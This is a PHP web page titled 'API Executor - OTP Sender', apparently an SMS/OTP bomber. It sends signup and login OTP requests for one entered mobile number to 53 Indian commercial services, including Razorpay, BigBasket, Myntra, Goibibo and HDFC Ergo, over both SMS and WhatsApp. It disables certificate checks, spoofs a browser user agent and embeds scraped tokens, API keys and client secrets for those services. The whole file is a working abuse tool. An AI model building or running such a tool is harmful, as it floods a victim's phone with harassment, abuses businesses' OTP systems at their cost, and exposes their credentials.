<!DOCTYPE html>
<html>
<head>
    <title>API Executor</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #333; }
        .api-result { 
            border: 1px solid #ddd; 
            padding: 10px; 
            margin: 10px 0; 
            border-radius: 5px;
            background-color: #f9f9f9;
        }
        .success { color: green; }
        .error { color: red; }
        .api-name { font-weight: bold; color: #0066cc; }
    </style>
</head>
<body>
    <h1>API Executor - OTP Sender</h1>
    <form method="get" action="">
        <label for="mobile">Enter Mobile Number:</label>
        <input type="text" id="mobile" name="mobile" required placeholder="9343256751" pattern="[0-9]{10}">
        <button type="submit">Submit</button>
    </form>

    <?php
    // Common function to make requests
    function makeRequest($url, $method = 'POST', $data = null, $headers = []) {
        $ch = curl_init();
        $options = [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Linux; Android 11; RMX2001) AppleWebKit/537.36',
        ];
        
        if ($method === 'POST') {
            $options[CURLOPT_POST] = true;
            if ($data) {
                if (is_array($data)) {
                    $options[CURLOPT_POSTFIELDS] = json_encode($data);
                } else {
                    $options[CURLOPT_POSTFIELDS] = $data;
                }
            }
        }
        
        if (!empty($headers)) {
            $headerArray = [];
            foreach ($headers as $key => $value) {
                $headerArray[] = "$key: $value";
            }
            $options[CURLOPT_HTTPHEADER] = $headerArray;
        }
        
        curl_setopt_array($ch, $options);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return ['status' => $httpCode, 'response' => $response];
    }

    if (isset($_GET['mobile'])) {
        $mobile = htmlspecialchars($_GET['mobile']);
        $mobile_10digit = substr($mobile, -10);
        
        $apis = [
            // 1. Borzodelivery OTP
            [
                "name" => "01. Borzodelivery OTP",
                "url" => "https://borzodelivery.com/in/user/send-sms",
                "headers" => [
                    "Host" => "borzodelivery.com",
                    "x-csrf-token" => "6bfd80b29cb1715694ae30390dd35265:1d4c6d8edca5f05c",
                    "accept" => "application/json",
                    "origin" => "https://borzodelivery.com",
                    "referer" => "https://borzodelivery.com/in"
                ],
                "data" => ["phone" => $mobile, "source" => "signup", "force_sms" => false]
            ],
            
            // 2. IGP OTP
            [
                "name" => "02. IGP OTP",
                "url" => "https://www.igp.com/v2/loginSignup",
                "headers" => [
                    "Host" => "www.igp.com",
                    "x-requested-with" => "XMLHttpRequest",
                    "origin" => "https://www.igp.com",
                    "referer" => "https://www.igp.com/"
                ],
                "data" => [
                    "email" => "",
                    "mprefix" => "91",
                    "mob" => $mobile_10digit,
                    "cid" => "99",
                    "claimNumber" => false,
                    "newUserFlag" => false,
                    "verifyOtp" => false,
                    "otp" => "",
                    "isGuest" => false,
                    "isInternational" => false
                ]
            ],
            
            // 3. Razorpay OTP
            [
                "name" => "03. Razorpay OTP",
                "url" => "https://api.razorpay.com/v1/standard_checkout/otp/create?key_id=rzp_live_oauth_RO6WikpcqNFBoA",
                "headers" => [
                    "Host" => "api.razorpay.com",
                    "Content-type" => "application/x-www-form-urlencoded",
                    "x-session-token" => "C0CBE6A85260606796589B742685D6DE02D693CB1B0AAA83EE16F915F41165C24B54E335AFE54C4AFA5F3149AD7DED16B8DA02CDA7F280D4EABF2C5E282922CC6B677AED40214E6D518567FFF87C8E98A710FF636DE616250FBA699D461059DD502E2717C012529D"
                ],
                "data" => "contact=%2B91" . $mobile . "&otp_reason=access_card_v2"
            ],
            
            // 4. Gokwik OTP
            [
                "name" => "04. Gokwik OTP",
                "url" => "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
                "headers" => [
                    "Host" => "gkx.gokwik.co",
                    "authorization" => "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc2MzkxMjE4NiwiZXhwIjoxNzYzOTEyMjQ2fQ.zZx7y5xpDjsnocEdTaD_DDKiWT34oU7LJUJCRoKpExs",
                    "gk-merchant-id" => "19g6im6ucihy2",
                    "origin" => "https://pdp.gokwik.co",
                    "referer" => "https://pdp.gokwik.co/"
                ],
                "data" => ["phone" => $mobile_10digit, "country" => "IN"]
            ],
            
            // 5. FreshTokri OTP
            [
                "name" => "05. FreshTokri OTP",
                "url" => "https://www.thefreshtokri.com/api/otp",
                "headers" => [
                    "Host" => "www.thefreshtokri.com",
                    "accept-language" => "en",
                    "origin" => "https://www.thefreshtokri.com",
                    "referer" => "https://www.thefreshtokri.com/"
                ],
                "data" => ["username" => "+91" . $mobile]
            ],
            
            // 6. Kredmint SMS OTP
            [
                "name" => "06. Kredmint SMS OTP",
                "url" => "https://merchant-dev-v2.kredmint.in/api/auth/login/?mobile=" . $mobile_10digit,
                "headers" => [
                    "Host" => "merchant-dev-v2.kredmint.in",
                    "authorization" => "Bearer undefined",
                    "origin" => "https://merchant-dev-v2.kredmint.in",
                    "referer" => "https://merchant-dev-dev2.kredmint.in/"
                ],
                "data" => ["username" => $mobile_10digit, "medium" => "SMS", "meta" => []]
            ],
            
            // 7. Kredmint WhatsApp OTP
            [
                "name" => "07. Kredmint WhatsApp OTP",
                "url" => "https://merchant-dev-v2.kredmint.in/api/auth/login/?mobile=" . $mobile_10digit . "&medium=WHATSAPP",
                "headers" => [
                    "Host" => "merchant-dev-v2.kredmint.in",
                    "authorization" => "Bearer undefined",
                    "origin" => "https://merchant-dev-v2.kredmint.in",
                    "referer" => "https://merchant-dev-v2.kredmint.in/"
                ],
                "data" => ["username" => $mobile_10digit, "medium" => "WHATSAPP", "meta" => []]
            ],
            
            // 8. Kleanex OTP
            [
                "name" => "08. Kleanex OTP",
                "url" => "https://kleanex.co.in/signup.aspx",
                "headers" => [
                    "Host" => "kleanex.co.in",
                    "origin" => "https://kleanex.co.in",
                    "referer" => "https://kleanex.co.in/signup.aspx"
                ],
                "data" => "inputMobile=" . $mobile_10digit . "&txtOTP=&inputemail="
            ],
            
            // 9. Allen OTP
            [
                "name" => "09. Allen OTP",
                "url" => "https://api.allen-live.in/api/v1/auth/sendOtp",
                "headers" => [
                    "Host" => "api.allen-live.in",
                    "x-client-type" => "mweb",
                    "x-referrer" => "https://allen.in/login?ret=%2Fprofile",
                    "origin" => "https://allen.in",
                    "referer" => "https://allen.in/"
                ],
                "data" => [
                    "country_code" => "91",
                    "phone_number" => $mobile_10digit,
                    "persona_type" => "STUDENT",
                    "otp_type" => "SHARED_DEFAULT"
                ]
            ],
            
            // 10. Reliance Digital OTP
            [
                "name" => "10. Reliance Digital OTP",
                "url" => "https://www.reliancedigital.in/ext/raven-api/register/send/otp/mobile",
                "headers" => [
                    "Host" => "www.reliancedigital.in",
                    "x-fp-signature" => "v1.1:9211d4f085de8e99232f7bd444dfac697d992060139ed2f6be7b0b3649e574dd",
                    "x-fp-date" => "20251123T162409Z",
                    "origin" => "https://www.reliancedigital.in",
                    "referer" => "https://www.reliancedigital.in/"
                ],
                "data" => ["mobile" => $mobile_10digit, "country_code" => "91"]
            ],
            
            // 11. Pride of Cows OTP
            [
                "name" => "11. Pride of Cows OTP",
                "url" => "https://prideofcows.com/prideofcows/api/customer/login",
                "headers" => [
                    "Host" => "prideofcows.com",
                    "X-CSRF-Token" => "MyS2XLb8c9Y0WsKYvNZmrVsLkaRsbnLsuNLYPU67iqNAcOM7m44dmn0_ttzIsDfvOT72wTwKJr6LsYlHKtfw8w==",
                    "X-Requested-With" => "XMLHttpRequest",
                    "origin" => "https://prideofcows.com",
                    "referer" => "https://prideofcows.com/poc/"
                ],
                "data" => ["MobileNo" => $mobile_10digit, "Source" => "Desktop", "Type" => "login"]
            ],
            
            // 12. MyG OTP
            [
                "name" => "12. MyG OTP",
                "url" => "https://www.myg.in/",
                "headers" => [
                    "Host" => "www.myg.in",
                    "x-requested-with" => "XMLHttpRequest",
                    "origin" => "https://www.myg.in",
                    "referer" => "https://www.myg.in/"
                ],
                "data" => "user_data%5Bphone%5D=%2B91+" . $mobile . "&otp_type=login"
            ],
            
            // 13. Hyperpure OTP
            [
                "name" => "13. Hyperpure OTP",
                "url" => "https://api.hyperpure.com/api/user/otpsms?isForgotPassword=true&userPhoneNumber=" . $mobile_10digit,
                "headers" => [
                    "Host" => "api.hyperpure.com",
                    "headerroute" => "v2",
                    "x-client" => "consumer",
                    "origin" => "https://www.hyperpure.com",
                    "referer" => "https://www.hyperpure.com/"
                ],
                "data" => ["isForgotPassword" => true, "userPhoneNumber" => $mobile_10digit]
            ],
            
            // 14. DealShare OTP
            [
                "name" => "14. DealShare OTP",
                "url" => "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
                "headers" => [
                    "Host" => "services.dealshare.in",
                    "pincode" => "302017",
                    "businessmodel" => "B2C",
                    "channel" => "APP",
                    "origin" => "https://www.dealshare.in",
                    "referer" => "https://www.dealshare.in/"
                ],
                "data" => [
                    "phoneNumber" => $mobile_10digit,
                    "name" => $mobile_10digit,
                    "hashCode" => "",
                    "resendOtp" => 0,
                    "source" => "web",
                    "loginType" => "OTP",
                    "deviceId" => "5b7969d49f863de7"
                ]
            ],
            
            // 15. BigBasket OTP
            [
                "name" => "15. BigBasket OTP",
                "url" => "https://www.bigbasket.com/member-tdl/v3/member/otp",
                "headers" => [
                    "Host" => "www.bigbasket.com",
                    "x-csrftoken" => "OFwogi1gKcWAzn9jTFaUqE7EgbyeJZ3kH2kPYwjxgueDeyTZqlBQG7PwWAfsOxqH",
                    "x-caller" => "Monster-SVC",
                    "x-entry-context" => "bbnow",
                    "origin" => "https://www.bigbasket.com",
                    "referer" => "https://www.bigbasket.com/"
                ],
                "data" => ["identifier" => $mobile_10digit, "referrer" => "unified_login", "recaptchaToken" => "dummy_token"]
            ],
            
            // 16. Blinkit OTP
            [
                "name" => "16. Blinkit OTP",
                "url" => "https://blinkit.com/v2/accounts/",
                "headers" => [
                    "Host" => "blinkit.com",
                    "content-type" => "application/x-www-form-urlencoded",
                    "app_client" => "consumer_web",
                    "origin" => "https://blinkit.com",
                    "referer" => "https://blinkit.com/"
                ],
                "data" => "user_phone=" . $mobile_10digit
            ],
            
            // 17. OneCard OTP
            [
                "name" => "17. OneCard OTP",
                "url" => "https://card.fplabs.tech/onecard/bff/openweb/v1/web/otp/generate",
                "headers" => [
                    "Host" => "card.fplabs.tech:9000",
                    "authorization" => "Basic ZnBsYWJzOjFGUExhYnMyMzIw",
                    "x-api-key" => "78fec47f31afbace1588051dc4a594b86fa8bced48e48c3123ba8b29b6bf30f1",
                    "origin" => "https://apply.getonecard.app",
                    "referer" => "https://apply.getonecard.app/"
                ],
                "data" => [
                    "mobile" => $mobile_10digit,
                    "deviceType" => "WEB",
                    "whatsappConsent" => true
                ]
            ],
            
            // 18. Reliance Retail OTP
            [
                "name" => "18. Reliance Retail OTP",
                "url" => "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp",
                "headers" => [
                    "Host" => "api.account.relianceretail.com",
                    "authorization" => "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXR1cm5fdWlfdXJsIjoid3d3Lmppb21hcnQuY29tL2N1c3RvbWVyL2FjY291bnQvbG9naW4_bXNpdGU9eWVzIiwiY2xpZW50X2lkIjoiZmRiNjQ2ZWEtZTcwOC00NzI1LWE5NTMtMjI4ZmExY2I4MzU1IiwiaWF0IjoxNzYzOTE2NzU1LCJzYWx0IjowfQ.EuQUMJ7GkDdwd2iaIZZAAGqVQx0aW0AT5f1yQl2t1WY",
                    "origin" => "https://account.relianceretail.com",
                    "referer" => "https://account.relianceretail.com/"
                ],
                "data" => ["mobile" => $mobile_10digit]
            ],
            
            // 19. Dava India OTP
            [
                "name" => "19. Dava India OTP",
                "url" => "https://www.davaindia.com/login",
                "headers" => [
                    "Host" => "www.davaindia.com",
                    "origin" => "https://www.davaindia.com",
                    "referer" => "https://www.davaindia.com/login"
                ],
                "data" => [[
                    "identifierType" => "mobile",
                    "phoneNumber" => "+91" . $mobile,
                    "email" => "",
                    "isWeb" => true
                ]]
            ],
            
            // 20. IndMoney OTP
            [
                "name" => "20. IndMoney OTP",
                "url" => "https://apixt-iw.indmoney.com/indshield/public/ext/v4/otp/generate",
                "headers" => [
                    "Host" => "apixt-iw.indmoney.com",
                    "platform" => "web",
                    "origin" => "https://www.indmoney.com",
                    "referer" => "https://www.indmoney.com/"
                ],
                "data" => [
                    "countryCode" => "+91",
                    "mobile" => $mobile_10digit,
                    "identity_token" => "dummy_token"
                ]
            ],
            
            // 21. Barbeque Nation Verify
            [
                "name" => "21. Barbeque Nation Verify",
                "url" => "https://www.barbequenation.com/api/v1/verify-user",
                "headers" => [
                    "Host" => "www.barbequenation.com",
                    "bbq-client-id" => "bc87c211-02e0-488e-9a87-acb7733b5ec2",
                    "bbq-client-secret" => "rybmu5-byTbam-hiqcys",
                    "origin" => "https://www.barbequenation.com",
                    "referer" => "https://www.barbequenation.com/"
                ],
                "data" => ["country_code" => "+91", "mobile_number" => (int)$mobile_10digit]
            ],
            
            // 22. Barbeque Nation OTP
            [
                "name" => "22. Barbeque Nation OTP",
                "url" => "https://www.barbequenation.com/api/v1/generate-otp",
                "headers" => [
                    "Host" => "www.barbequenation.com",
                    "origin" => "https://www.barbequenation.com",
                    "referer" => "https://www.barbequenation.com/"
                ],
                "data" => ["mobile_number" => $mobile_10digit, "country_code" => "+91", "otp_id" => ""]
            ],
            
            // 23. Univest OTP (GET)
            [
                "name" => "23. Univest OTP",
                "url" => "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber=" . $mobile_10digit,
                "headers" => [
                    "Host" => "api.univest.in",
                    "origin" => "https://univest.in",
                    "referer" => "https://univest.in/"
                ],
                "data" => null,
                "method" => "GET"
            ],
            
            // 24. ManMatters OTP
            [
                "name" => "24. ManMatters OTP",
                "url" => "https://api.manmatters.com/portal/auth/send-otp",
                "headers" => [
                    "Host" => "api.manmatters.com",
                    "repeatuser" => "false",
                    "mwlang" => "en",
                    "origin" => "https://manmatters.com",
                    "referer" => "https://manmatters.com/"
                ],
                "data" => ["phoneNumber" => $mobile_10digit, "source" => "", "resend" => false]
            ],
            
            // 25. DigiHaat OTP
            [
                "name" => "25. DigiHaat OTP",
                "url" => "https://prod.digihaat.in/clientApis/v2/auth/sendOTP",
                "headers" => [
                    "Host" => "prod.digihaat.in",
                    "web" => "true",
                    "origin" => "https://digihaat.in",
                    "referer" => "https://digihaat.in/"
                ],
                "data" => ["mobile" => $mobile_10digit, "appHash" => "WEB_APP_HASH"]
            ],
            
            // 26. Myntra OTP
            [
                "name" => "26. Myntra OTP",
                "url" => "https://www.myntra.com/gateway/v1/auth/getotp",
                "headers" => [
                    "Host" => "www.myntra.com",
                    "x-myntraweb" => "Yes",
                    "origin" => "https://www.myntra.com",
                    "referer" => "https://www.myntra.com/login"
                ],
                "data" => ["phoneNumber" => $mobile_10digit, "signup" => "ONECLICK"]
            ],
            
            // 27. The Derma Co OTP
            [
                "name" => "27. The Derma Co OTP",
                "url" => "https://auth.thedermaco.com/v1/auth/initiate-signup",
                "headers" => [
                    "Host" => "auth.thedermaco.com",
                    "isweb" => "true",
                    "origin" => "https://thedermaco.com",
                    "referer" => "https://thedermaco.com/"
                ],
                "data" => ["mobile" => $mobile_10digit, "referralCode" => ""]
            ],
            
            // 28. Nathabit WhatsApp OTP
            [
                "name" => "28. Nathabit WhatsApp OTP",
                "url" => "https://authorize.api.nathabit.in/v2/auth/v2/otp/",
                "headers" => [
                    "Host" => "authorize.api.nathabit.in",
                    "origin" => "https://nathabit.in",
                    "referer" => "https://nathabit.in/"
                ],
                "data" => ["phone" => $mobile_10digit, "send_on_whatsapp" => true, "address_consent" => true, "email" => ""]
            ],
            
            // 29. Nathabit SMS OTP
            [
                "name" => "29. Nathabit SMS OTP",
                "url" => "https://authorize.api.nathabit.in/v2/auth/v2/otp/",
                "headers" => [
                    "Host" => "authorize.api.nathabit.in",
                    "origin" => "https://nathabit.in",
                    "referer" => "https://nathabit.in/"
                ],
                "data" => ["phone" => $mobile_10digit, "send_on_whatsapp" => false, "address_consent" => true, "email" => ""]
            ],
            
            // 30. NNNow OTP
            [
                "name" => "30. NNNow OTP",
                "url" => "https://api.nnnow.com/d/apiV2/otp/generateOtp/v2/registration/flash",
                "headers" => [
                    "Host" => "api.nnnow.com",
                    "module" => "odin",
                    "bbversion" => "v2",
                    "origin" => "https://www.nnnow.com",
                    "referer" => "https://www.nnnow.com/"
                ],
                "data" => [
                    "mobileNumber" => $mobile_10digit,
                    "captchaToken" => "dummy_token",
                    "otpTemplateId" => "5b4e2e49b70e040008ffbcbe"
                ]
            ],
            
            // 31. Testbook OTP
            [
                "name" => "31. Testbook OTP",
                "url" => "https://api.testbook.com/api/v2/mobile/signup?mobile=" . $mobile_10digit,
                "headers" => [
                    "Host" => "api.testbook.com",
                    "x-tb-client" => "web,1.2",
                    "origin" => "https://testbook.com",
                    "referer" => "https://testbook.com/"
                ],
                "data" => [
                    "mobile" => $mobile_10digit,
                    "signupDetails" => ["page" => "HomePage", "pagePath" => "/", "pageType" => "HomePage"]
                ]
            ],
            
            // 32. HealthKart SMS OTP (GET)
            [
                "name" => "32. HealthKart SMS OTP",
                "url" => "https://www.healthkart.com/veronica/user/validate/1/" . $mobile_10digit . "/signup?plt=2&st=1",
                "headers" => [
                    "Host" => "www.healthkart.com",
                    "plt" => "2",
                    "st" => "1",
                    "referer" => "https://www.healthkart.com/"
                ],
                "data" => null,
                "method" => "GET"
            ],
            
            // 33. HealthKart WhatsApp OTP (GET)
            [
                "name" => "33. HealthKart WhatsApp OTP",
                "url" => "https://www.healthkart.com/veronica/user/validate/whatsapp/1/" . $mobile_10digit . "/signup?plt=2&st=1",
                "headers" => [
                    "Host" => "www.healthkart.com",
                    "plt" => "2",
                    "st" => "1",
                    "referer" => "https://www.healthkart.com/"
                ],
                "data" => null,
                "method" => "GET"
            ],
            
            // 34. Tira Beauty OTP
            [
                "name" => "34. Tira Beauty OTP",
                "url" => "https://www.tirabeauty.com/api/service/application/user/authentication/v1.0/login/otp?platform=62d53777f5ad942d3e505f77",
                "headers" => [
                    "Host" => "www.tirabeauty.com",
                    "authorization" => "Bearer NjJkNTM3NzdmNWFkOTQyZDNlNTA1Zjc3OmlrZGlRdjZ0ag==",
                    "x-currency-code" => "INR",
                    "origin" => "https://www.tirabeauty.com",
                    "referer" => "https://www.tirabeauty.com/"
                ],
                "data" => ["mobile" => $mobile_10digit, "country_code" => "91", "captcha_code" => "dummy_captcha"]
            ],
            
            // 35. Gokwik 2 OTP
            [
                "name" => "35. Gokwik 2 OTP",
                "url" => "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
                "headers" => [
                    "Host" => "gkx.gokwik.co",
                    "authorization" => "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc2MzkyMDMwNCwiZXhwIjoxNzYzOTIwMzY0fQ.SPoD-u_MFuhgmowTGV3NqAts7z_tf2B45qypzddXCmA",
                    "gk-merchant-id" => "19g6ilv2apdlm",
                    "origin" => "https://pdp.gokwik.co",
                    "referer" => "https://pdp.gokwik.co/"
                ],
                "data" => ["phone" => $mobile_10digit, "country" => "IN"]
            ],
            
            // 36. HDFC Ergo SMS OTP
            [
                "name" => "36. HDFC Ergo SMS OTP",
                "url" => "https://here.co.in/users/v1/customer-portal/send-otp",
                "headers" => [
                    "Host" => "here.co.in",
                    "x-api-client" => "Website",
                    "x-origin" => "https://sh.hdfcergo.com",
                    "origin" => "https://www.hdfcergo.com",
                    "referer" => "https://www.hdfcergo.com/"
                ],
                "data" => ["mobile" => $mobile_10digit, "countryCodeId" => "b43569eb-6798-43fb-8d27-47d55d7c544b", "source" => "sms"]
            ],
            
            // 37. HDFC Ergo WhatsApp OTP
            [
                "name" => "37. HDFC Ergo WhatsApp OTP",
                "url" => "https://here.co.in/users/v1/customer-portal/send-otp",
                "headers" => [
                    "Host" => "here.co.in",
                    "x-api-client" => "Website",
                    "x-origin" => "https://sh.hdfcergo.com",
                    "origin" => "https://www.hdfcergo.com",
                    "referer" => "https://www.hdfcergo.com/"
                ],
                "data" => ["mobile" => $mobile_10digit, "countryCodeId" => "b43569eb-6798-43fb-8d27-47d55d7c544b", "source" => "whatsapp"]
            ],
            
            // 38. Goibibo SMS OTP
            [
                "name" => "38. Goibibo SMS OTP",
                "url" => "https://userservice.goibibo.com/ext/web/pwa/send/token/OTP_IS_REG",
                "headers" => [
                    "Host" => "userservice.goibibo.com",
                    "Authorization" => "h4nhc9jcgpAGIjp",
                    "language" => "eng",
                    "currency" => "inr",
                    "origin" => "https://www.goibibo.com",
                    "referer" => "https://www.goibibo.com/"
                ],
                "data" => [
                    "loginId" => $mobile_10digit,
                    "countryCode" => 91,
                    "channel" => ["MOBILE"],
                    "type" => 6,
                    "appHashKey" => "@www.goibibo.com #"
                ]
            ],
            
            // 39. Goibibo WhatsApp OTP
            [
                "name" => "39. Goibibo WhatsApp OTP",
                "url" => "https://userservice.goibibo.com/ext/web/pwa/send/token/OTP_IS_REG",
                "headers" => [
                    "Host" => "userservice.goibibo.com",
                    "Authorization" => "h4nhc9jcgpAGIjp",
                    "language" => "eng",
                    "currency" => "inr",
                    "origin" => "https://www.goibibo.com",
                    "referer" => "https://www.goibibo.com/"
                ],
                "data" => [
                    "loginId" => $mobile_10digit,
                    "countryCode" => 91,
                    "channel" => ["whatsapp"],
                    "type" => 6,
                    "appHashKey" => "@www.goibibo.com #"
                ]
            ],
            
            // 40. Cybx OTP
            [
                "name" => "40. Cybx OTP",
                "url" => "https://cybx.in/wp-admin/admin-ajax.php",
                "headers" => [
                    "Host" => "cybx.in",
                    "x-requested-with" => "XMLHttpRequest",
                    "origin" => "https://cybx.in",
                    "referer" => "https://cybx.in/register/"
                ],
                "data" => "action=generate_otp&phone=" . $mobile_10digit
            ],
            
            // 41. Cybx Validate
            [
                "name" => "41. Cybx Validate",
                "url" => "https://cybx.in/wp-admin/admin-ajax.php",
                "headers" => [
                    "Host" => "cybx.in",
                    "x-requested-with" => "XMLHttpRequest",
                    "origin" => "https://cybx.in",
                    "referer" => "https://cybx.in/register/"
                ],
                "data" => "action=validate_mobile&phone=" . $mobile_10digit
            ],
            
            // 42. Victory Cinema OTP
            [
                "name" => "42. Victory Cinema OTP",
                "url" => "https://victorycinema.in/wp-admin/admin-ajax.php",
                "headers" => [
                    "Host" => "victorycinema.in",
                    "x-requested-with" => "XMLHttpRequest",
                    "origin" => "https://victorycinema.in",
                    "referer" => "https://victorycinema.in/login/"
                ],
                "data" => "action=msg19_send_otp_sms&mobile_number=91" . $mobile_10digit
            ],
            
            // 43. Autope OTP
            [
                "name" => "43. Autope OTP",
                "url" => "https://itpo.autope.in/auth/clt/msite/v1/user-msite/send-mobile-otp",
                "headers" => [
                    "Host" => "itpo.autope.in",
                    "key" => "Z3f6768993432567512793GY5S",
                    "msiterequest" => "YES",
                    "origin" => "https://itpo.autope.in",
                    "referer" => "https://itpo.autope.in/login"
                ],
                "data" => ["mobileNumber" => $mobile_10digit, "mobileHash" => "dummy_hash"]
            ],
            
            // 44. Mannubhai OTP
            [
                "name" => "44. Mannubhai OTP",
                "url" => "https://waterpurifierservicecenter.in/customer/ro_customer/roservice_sendotp.php",
                "headers" => [
                    "Host" => "waterpurifierservicecenter.in",
                    "origin" => "https://www.mannubhai.com",
                    "referer" => "https://www.mannubhai.com/"
                ],
                "data" => ["phoneNumber" => $mobile_10digit]
            ],
            
            // 45. MerchGarage OTP (GET)
            [
                "name" => "45. MerchGarage OTP",
                "url" => "https://papi.merchgarage.com/login/with/otp?country=IN&contactno=" . $mobile_10digit,
                "headers" => [
                    "Host" => "papi.merchgarage.com",
                    "x-auth-token" => "65bc09cf-1b86-4cdc-b796-30ad1f59e73a",
                    "custom-domain" => "www.merchgarage.com",
                    "origin" => "https://www.merchgarage.com",
                    "referer" => "https://www.merchgarage.com/"
                ],
                "data" => [],
                "method" => "GET"
            ],
            
            // 46. FreshToHome OTP
            [
                "name" => "46. FreshToHome OTP",
                "url" => "https://www.freshtohome.com/xmlconnect/otplogin/sendOtp/appid/undefined/source/mobileweb/?v=",
                "headers" => [
                    "Host" => "www.freshtohome.com",
                    "content-type" => "application/x-www-form-urlencoded",
                    "x-uuid" => "2194d246-4e4e-4fc0-b9e8-9b8a520d15d1",
                    "origin" => "https://www.freshtohome.com",
                    "referer" => "https://www.freshtohome.com/"
                ],
                "data" => "mobile=" . $mobile_10digit
            ],
            
            // 47. Dmart OTP
            [
                "name" => "47. Dmart OTP",
                "url" => "https://digital.dmart.in/api/v1/secure/signup",
                "headers" => [
                    "Host" => "digital.dmart.in",
                    "x-request-id" => "NjdmYTUwNTAtMjdjZC00NTJmLWE5ZDktNWY0MzcxZmVmOWZjfHxTLTIwMjUxMTE5XzA1MTUxMXx8LTEwMDI=",
                    "storeid" => "10685",
                    "origin" => "https://www.dmart.in",
                    "referer" => "https://www.dmart.in/"
                ],
                "data" => [
                    "firstName" => "Test",
                    "lastName" => "User",
                    "userId" => $mobile_10digit,
                    "pincode" => "400001",
                    "pincodeArea" => "Mumbai",
                    "lat" => "19.0760",
                    "long" => "72.8777",
                    "otpRegistration" => "true"
                ]
            ],
            
            // 48. ChemDMart OTP
            [
                "name" => "48. ChemDMart OTP",
                "url" => "https://chemdmart.com/send-otp",
                "headers" => [
                    "Host" => "chemdmart.com",
                    "content-type" => "application/x-www-form-urlencoded",
                    "origin" => "https://chemdmart.com",
                    "referer" => "https://chemdmart.com/login"
                ],
                "data" => "_token=dummy_token&type=mobile&identifier=" . $mobile_10digit
            ],
            
            // 49. AbhiBus OTP
            [
                "name" => "49. AbhiBus OTP",
                "url" => "https://www.abhibus.com/wap/sendOtp",
                "headers" => [
                    "Host" => "www.abhibus.com",
                    "content-type" => "multipart/form-data; boundary=----WebKitFormBoundaryUJsAm5YLcSAEROIA",
                    "x-app-name" => "nextgenweb",
                    "origin" => "https://www.abhibus.com",
                    "referer" => "https://www.abhibus.com/"
                ],
                "data" => "------WebKitFormBoundaryUJsAm5YLcSAEROIA\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n" . $mobile_10digit . "\r\n------WebKitFormBoundaryUJsAm5YLcSAEROIA\r\nContent-Disposition: form-data; name=\"prd\"\r\n\r\nmobile\r\n------WebKitFormBoundaryUJsAm5YLcSAEROIA--"
            ],
            
            // 50. TVS Motor OTP
            [
                "name" => "50. TVS Motor OTP",
                "url" => "https://www.tvsmotor.com/api/Ecommerce/GetAccountOtp",
                "headers" => [
                    "Host" => "www.tvsmotor.com",
                    "x-requested-with" => "XMLHttpRequest",
                    "origin" => "https://www.tvsmotor.com",
                    "referer" => "https://www.tvsmotor.com/account/login"
                ],
                "data" => "MobileNumber=" . $mobile_10digit . "&Locale=V"
            ],
            
            // 51. BetterHalf OTP
            [
                "name" => "51. BetterHalf OTP",
                "url" => "https://adminapi.betterhalf.ai/v2/auth/otp/send/",
                "headers" => [
                    "Host" => "adminapi.betterhalf.ai",
                    "origin" => "https://admin.betterhalf.ai",
                    "referer" => "https://admin.betterhalf.ai/"
                ],
                "data" => ["mobile" => $mobile_10digit, "isd_code" => "+91", "medium" => "SMS"]
            ],
            
            // 52. ZestMoney OTP
            [
                "name" => "52. ZestMoney OTP",
                "url" => "https://authentication.zestmoney.in/v2/mobile/otp/",
                "headers" => [
                    "Host" => "authentication.zestmoney.in",
                    "token" => "135b043150475d7288b936606e086af5c1fb7f0eff15256748f5ad078ebdcf85",
                    "origin" => "https://app.zestmoney.in",
                    "referer" => "https://app.zestmoney.in/"
                ],
                "data" => [
                    "MobileNumber" => "91" . $mobile_10digit,
                    "MessageParams" => ["MerchantKey" => "oitPy6oMpgv6S7ju7KmKwtSAsC6xUJ2steHYlrxQoYaGs7DKKUo/EoBavmjfMVaT"]
                ]
            ],
            
            // 53. Kremasino OTP
            [
                "name" => "53. Kremasino OTP",
                "url" => "https://www.onrender.kremasino.com/api/send-otp",
                "headers" => [
                    "Host" => "www.onrender.kremasino.com",
                    "origin" => "https://www.kremasino.com",
                    "referer" => "https://www.kremasino.com/"
                ],
                "data" => ["phone" => $mobile_10digit]
            ]
        ];

        echo "<h2>Results for Mobile: " . $mobile . "</h2>";
        echo "<p>Total APIs: " . count($apis) . "</p>";
        
        foreach ($apis as $api) {
            echo "<div class='api-result'>";
            echo "<p class='api-name'>" . $api['name'] . "</p>";
            
            $method = isset($api['method']) ? $api['method'] : 'POST';
            $result = makeRequest($api['url'], $method, $api['data'], $api['headers']);
            
            echo "<p><strong>URL:</strong> " . htmlspecialchars($api['url']) . "</p>";
            echo "<p><strong>Status Code:</strong> <span class='" . ($result['status'] == 200 ? 'success' : 'error') . "'>" . $result['status'] . "</span></p>";
            
            if ($result['response']) {
                echo "<p><strong>Response:</strong> " . htmlspecialchars(substr($result['response'], 0, 500));
                if (strlen($result['response']) > 500) {
                    echo "... [truncated]";
                }
                echo "</p>";
            }
            
            echo "</div>";
        }
        
        echo "<hr><h3>All 53 APIs processed for mobile number: " . $mobile . "</h3>";
    }
    ?>
</body>
</html>